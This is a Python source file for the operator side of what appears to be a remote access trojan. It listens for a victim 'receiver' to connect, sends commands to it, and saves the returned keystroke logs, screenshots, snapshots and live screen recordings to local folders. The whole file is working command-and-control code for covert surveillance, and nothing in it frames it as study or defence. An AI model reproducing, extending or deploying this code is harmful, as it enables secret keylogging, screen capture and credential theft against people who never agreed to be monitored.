#!/usr/bin/env python3
"""
TCP Command Sender
This program listens for incoming connections and sends commands to execute.
"""

import os
import socket
import sys
from datetime import datetime
from tqdm import tqdm

# Import from utils modules
from utils.config import DEFAULT_HOST, DEFAULT_PORT, BUFFER_SIZE, BINARY_START_MARKER
from utils.protocol import receive_text, receive_binary, peek_for_binary


# Ensure data directories exist
DATA_DIRS = ["data", "data/keylogs", "data/screenshots", "data/snapshots", "data/screenrecordings"]

for dir_path in DATA_DIRS:
    os.makedirs(dir_path, exist_ok=True)


def handle_keylog_stream(client_socket):
    """
    Handle keylogger streaming mode.
    Receives keystrokes in real-time and writes to file.
    Non-blocking: Press Enter to send /stop command.
    """
    import threading

    # Receive start marker with timestamp
    data = receive_text(client_socket)
    if not data.startswith("<KEYLOG_START>"):
        print(f"[Unexpected keylog response: {data}]")
        return

    timestamp = data.replace("<KEYLOG_START>", "").strip()
    filename = f"data/keylogs/keylog_{timestamp}.txt"

    print(f"[Keylogger started - saving to {filename}]")
    print("[Press Enter to send /stop command]")
    print("-" * 60)

    # Flag to signal stop
    stop_requested = threading.Event()

    def input_thread():
        """Wait for user to press Enter"""
        try:
            input()  # Wait for Enter
            stop_requested.set()
        except:
            pass

    # Start input thread
    threading.Thread(target=input_thread, daemon=True).start()

    # Open file for writing
    with open(filename, "w", encoding="utf-8") as f:
        buffer = b""

        # Set socket timeout for non-blocking receive
        client_socket.settimeout(0.1)

        while not stop_requested.is_set():
            try:
                # Receive data with timeout
                chunk = client_socket.recv(BUFFER_SIZE)
                if not chunk:
                    print("\n[Connection lost]")
                    break

                buffer += chunk

                # Check for end marker
                if b"<KEYLOG_END>" in buffer:
                    # Extract any remaining keystrokes before end marker
                    remaining = buffer.split(b"<KEYLOG_END>")[0]
                    if remaining:
                        text = remaining.decode("utf-8", errors="replace")
                        sys.stdout.write(text)
                        sys.stdout.flush()
                        f.write(text)

                    # Receive the final text response
                    client_socket.settimeout(None)  # Reset timeout
                    receive_text(client_socket)
                    break

                # Process available data
                try:
                    text = buffer.decode("utf-8", errors="replace")
                    buffer = b""  # Clear buffer after successful decode

                    # Display and save keystroke
                    sys.stdout.write(text)
                    sys.stdout.flush()
                    f.write(text)

                except UnicodeDecodeError:
                    # Incomplete UTF-8 sequence, wait for more data
                    pass

            except socket.timeout:
                # Timeout - check if stop requested
                continue
            except KeyboardInterrupt:
                print("\n[Interrupted - stopping keylogger]")
                stop_requested.set()
                break

        # Reset socket timeout
        client_socket.settimeout(None)

        # If user requested stop, send /stop command
        if stop_requested.is_set() and not b"<KEYLOG_END>" in buffer:
            print("\n[Sending /stop command...]")
            client_socket.sendall(b"/stop")
            # Wait for confirmation
            try:
                receive_text(client_socket)
            except:
                pass

    print(f"\n[Keylog saved to {filename}]")


def handle_screenrecord_stream(client_socket):
    """
    Handle screen recording frame streaming.
    Receives frames and builds video using cv2.VideoWriter.
    """
    try:
        import cv2
        import numpy as np
    except ImportError:
        print("[ERROR: opencv-python not installed. Run: pip install opencv-python]")
        receive_text(client_socket)  # Consume error message
        return

    # Receive start marker with metadata
    data = receive_text(client_socket)
    if not data.startswith("<RECORDING_START>"):
        print(f"[Unexpected recording response: {data}]")
        return

    metadata = data.replace("<RECORDING_START>", "").strip()
    resolution, fps, timestamp = metadata.split("|")
    width, height = map(int, resolution.split("x"))
    fps = int(fps)

    filename = f"data/screenrecordings/recording_{timestamp}.mp4"

    print(f"[Screen recording started: {width}x{height} @ {fps} FPS]")
    print(f"[Saving to {filename}]")
    print("[Press Enter to send /stop command]")
    print()

    # Flag to signal stop
    import threading

    stop_requested = threading.Event()

    def input_thread():
        """Wait for user to press Enter"""
        try:
            input()  # Wait for Enter
            stop_requested.set()
        except:
            pass

    # Start input thread
    threading.Thread(target=input_thread, daemon=True).start()

    # Setup video writer
    # Try H264 first, fallback to mp4v
    fourcc_options = [
        ("avc1", "H264"),
        ("H264", "H264"),
        ("mp4v", "MPEG-4"),
    ]

    out = None
    for fourcc_code, codec_name in fourcc_options:
        try:
            fourcc = cv2.VideoWriter_fourcc(*fourcc_code)
            out = cv2.VideoWriter(filename, fourcc, fps, (width, height))
            if out.isOpened():
                print(f"[Using codec: {codec_name}]")
                break
            else:
                print(f"[Codec {codec_name} ({fourcc_code}) not available, trying next...]")
            out.release()
            out = None
        except Exception as e:
            print(f"[Codec {codec_name} ({fourcc_code}) failed: {e}]")
            continue

    if out is None:
        print("[ERROR: Could not initialize video writer]")
        # Consume remaining frames
        while True:
            try:
                if peek_for_binary(client_socket):
                    receive_binary(client_socket)
                else:
                    receive_text(client_socket)
                    break
            except:
                break
        return

    frame_count = 0

    try:
        with tqdm(desc="Recording", unit="frames") as pbar:
            while not stop_requested.is_set():
                # Check if next data is binary (frame) or text (end marker)
                if peek_for_binary(client_socket, timeout=0.1):
                    # Receive frame
                    frame_name, frame_data = receive_binary(client_socket)

                    # Decode JPEG frame
                    nparr = np.frombuffer(frame_data, np.uint8)
                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

                    if frame is not None:
                        # Write to video
                        out.write(frame)
                        frame_count += 1
                        pbar.update(1)
                    else:
                        print(f"\n[Warning: Failed to decode frame {frame_count}]")
                else:
                    # Check for end marker
                    try:
                        client_socket.settimeout(0.1)
                        data = receive_text(client_socket)
                        client_socket.settimeout(None)
                        if "<RECORDING_END>" in data:
                            break
                    except socket.timeout:
                        # No data yet, check stop flag again
                        continue
                    except:
                        break

            # If user requested stop, send /stop command
            if stop_requested.is_set():
                print("\n[Sending /stop command...]")
                client_socket.sendall(b"/stop")
                # Wait for confirmation
                try:
                    receive_text(client_socket)
                except:
                    pass

    except KeyboardInterrupt:
        print("\n[Interrupted - stopping recording]")
        try:
            client_socket.sendall(b"/stop")
            receive_text(client_socket)
        except:
            pass
    except Exception as e:
        print(f"\n[Recording error: {e}]")
    finally:
        out.release()

    print(f"\n[Recording complete: {filename}]")
    print(f"[Total frames: {frame_count}]")
    print(f"[Duration: {frame_count / fps:.1f} seconds]")


def handle_response(client_socket, command):
    """
    Handle response from receiver.
    Auto-detects binary vs text and routes to appropriate handler.
    """
    # Special handling for keylogger mode
    if command == "/keylogger":
        handle_keylog_stream(client_socket)
        return

    # Special handling for screen recording
    if command == "/screenrecord":
        handle_screenrecord_stream(client_socket)
        return

    # Check if response is binary
    if peek_for_binary(client_socket, timeout=0.5):
        # Receive binary data
        data_type, binary_data = receive_binary(client_socket)

        # Determine file path based on data type
        if data_type.startswith("ss_") or data_type.startswith("screenshot_"):
            filepath = f"data/screenshots/{data_type}"
        elif data_type.startswith("snap_") or data_type.startswith("snapshot_"):
            filepath = f"data/snapshots/{data_type}"
        else:
            # Generic binary file
            filepath = f"data/{data_type}"

        # Save binary data
        with open(filepath, "wb") as f:
            f.write(binary_data)

        print(f"[Saved: {filepath} ({len(binary_data):,} bytes)]")
        print()
    else:
        # Receive text response
        response = receive_text(client_socket)

        # Print response
        if response:
            print(response)
            if not response.endswith("\n"):
                print()


def start_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
    """
    Start the TCP command sender server.

    Args:
        host: The host address to bind to (0.0.0.0 means all available interfaces)
        port: The port number to listen on
    """
    # Create a TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Allow reuse of address to avoid "Address already in use" errors
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        # Bind the socket to the host and port
        server_socket.bind((host, port))

        # Listen for incoming connections (max 1 queued connection)
        server_socket.listen(1)

        print(f"Listening on {host}:{port}")
        print("Waiting for client to connect...\n")

        # Main server loop - accept multiple clients sequentially
        while True:
            # Accept a connection
            client_socket, client_address = server_socket.accept()
            print(f"Connected: {client_address[0]}:{client_address[1]}")
            print("Type /help for available commands\n")

            # Continuously read user input and send commands
            try:
                while True:
                    try:
                        # Get command from user
                        command = input("command> ")

                        # Skip empty commands
                        if not command.strip():
                            continue

                        # Send the command
                        client_socket.sendall(command.encode("utf-8"))
                        print()

                        # Handle response
                        handle_response(client_socket, command)

                    except KeyboardInterrupt:
                        print("\n\nExiting...")
                        raise  # Re-raise to exit server loop
                    except BrokenPipeError:
                        print("\nConnection closed by receiver")
                        break
                    except ConnectionResetError:
                        print("\nConnection lost")
                        break
                    except Exception as e:
                        print(f"\nError: {e}")
                        break

            finally:
                # Clean up client connection
                client_socket.close()
                print("\nWaiting for next client to connect...\n")

    except KeyboardInterrupt:
        print("\n\nExiting...")
    except OSError as e:
        print(f"Socket error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
    finally:
        server_socket.close()


if __name__ == "__main__":
    print("\n[ TCP Command Sender ]\n")
    start_sender(DEFAULT_HOST, DEFAULT_PORT)
